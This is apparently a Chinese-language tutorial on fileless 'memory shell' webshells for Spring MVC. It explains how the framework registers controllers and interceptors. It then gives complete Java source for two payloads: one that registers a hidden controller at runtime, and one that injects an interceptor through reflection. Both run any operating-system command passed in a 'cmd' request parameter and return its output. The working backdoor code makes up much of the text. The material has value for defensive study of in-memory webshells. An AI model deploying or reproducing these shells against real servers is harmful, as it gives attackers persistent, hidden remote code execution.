            SpringMVC
            org.springframework.web.servlet.DispatcherServlet
             contextConfigLocation
                classpath:springmvc-servlet.xml
            1
            SpringMVC
            /
#### 配置springmvc-servlet.xml
#### 配置的位置
### 流程分析
#### 获取context
    第一种：getCurrentWebApplicationContext()
    // getCurrentWebApplicationContext方法获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
    第二种：WebApplicationContextUtils
    // 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
    第三种：RequestContextUtils
    // 通过 ServletRequest 类的实例来获得 Child WebApplicationContextWebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
    第四种：getAttribute
    // 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext
#### 获取RequestMappingHandlerMapping
    RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
    虽然获取的是RequestMappingHandlerMapping类
    但是RequestMappingHandlerMapping继承自AbstractHandlerMethodMapping
    同样拥有register
#### 注册Controller
这里主要是通过register进行注册Controller
可以看到register方法的三个参数的类型
这里主要是映射关系，需要配置url和方法的方式
下面看一下RequestMappingInfo类
构造方法
handler是一个Object类，及自定义的Controller类的实例对象
自定义的Controller类方法的method类
### 内存马
    package com.naihe.controller;
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestMethod;
    import org.springframework.web.bind.annotation.ResponseBody;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import javax.servlet.http.HttpServletRequest;
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.lang.reflect.Method;
    @Controller
    public class Demo {
        @ResponseBody
        @RequestMapping(value = "/inject", method = RequestMethod.GET)
        public void inject() throws NoSuchMethodException {
            // 1. 利用spring内部方法获取context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 2. 从context中获得 RequestMappingHandlerMapping 的实例
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 3. 通过反射获得自定义 controller 中的 Method 对象
            Method method = InjectToController.class.getMethod("test");
            // 4. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/demo");
            // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 6. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            InjectToController injectToController = new InjectToController();
            mappingHandlerMapping.registerMapping(info, injectToController, method);
        }
        @ResponseBody
        public class InjectToController {
            public InjectToController(){
            }
            public String test() throws Exception {
                // 获取request
                HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
                InputStream is = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
                InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                BufferedReader br = new BufferedReader(isr);
                String str = "";
                String line = "";
                while ((line = br.readLine())!=null){
                    str+=line;
                }
                is.close();
                br.close();
                return str;
            }
        }
    }
### 效果
## Interceptor内存马
### interceptor基础
#### 配置springmvc-servlet.xml
#### Demo
    package com.naihe.Interceptor;
    import org.springframework.web.servlet.HandlerInterceptor;
    import org.springframework.web.servlet.ModelAndView;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    public class MyInterceptor implements HandlerInterceptor {
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            System.out.println("拦截器执行");
            request.getRequestDispatcher("/WEB-INF/pages/error.jsp").forward(request,response);
            return true;
        }
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            System.out.println("控制器执行后执行");
        }
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            System.out.println("jsp页面执行后执行");
        }
    }
hello
这里是后面内存马需要的可访问的页面
    package com.naihe.controller;
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.web.bind.annotation.PathVariable;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    @Controller
    public class hello {
        @ResponseBody
        @RequestMapping("/cl1")
        public String hello(String name, Model model){
            model.addAttribute("msg",name);
            return "hello";
        }
    }
### 流程分析
#### Interceptor调用
在org.springframework.web.servlet.DispatcherServlet的doDispatch方法下断点
后面会调用mappedHandler.applyPreHandle方法
这里遍历使用的interceptors，并调用其preHandle方法，
#### 添加Interceptor
进入getHandler方法，这里主要是获取Interceptor
进入gethandler
进入getHandlerExecutionChain
这里可以看到将Interceptor遍历出来，在添加到chain
在这里可以看到所有的监听器
在这里观察一下数据结构，发现是MappedInterceptor中包含了url地址和自定义拦截器的实例对象
需要反射创建一个MappedInterceptor对象，并添加上我们的interceptor类和includePatterns
这里判断了访问地址和Interceptor地址是否符合要去，如果不符合的话就不会加载
### 内存马
    package com.naihe.controller;
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestMethod;
    import org.springframework.web.bind.annotation.ResponseBody;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.servlet.HandlerInterceptor;
    import org.springframework.web.servlet.ModelAndView;
    import org.springframework.web.servlet.handler.MappedInterceptor;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    @Controller
    public class TestInterceptor{
        @ResponseBody
        @RequestMapping(value = "/interceptor", method = RequestMethod.GET)
        public String inject() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {
            try{
                // 获取context
                WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
                // 从context中获取AbstractHandlerMapping的实例对象
                org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                // 反射获取adaptedInterceptors属性
                java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                field.setAccessible(true);
                java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping);
                //生成一个MappedInterceptor对象
                MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]{"/cl1"},null,new InterceptorDemo());
                // 添加到adaptedInterceptors中
                adaptedInterceptors.add(mappedInterceptor);  //  添加全局interceptor
                return "ok";
            } catch (Exception e) {
                return "no";
            }
        }
    }
    class InterceptorDemo implements HandlerInterceptor {
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            InputStream is = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            InputStreamReader isr = new InputStreamReader(is, "UTF-8");
            BufferedReader br = new BufferedReader(isr);
            String str = "";
            String line = "";
            while ((line = br.readLine())!=null){
                str+=line;
            }
            is.close();
            br.close();
            response.getWriter().write(str);
            return false;
        }
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        }
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        }
    }
### 效果
访问cl1，注意在这里cl1是必须存在的，前面给了源码
访问一个普通页面，并传参
访问注入界面，注入内存马
再次访问之前的页面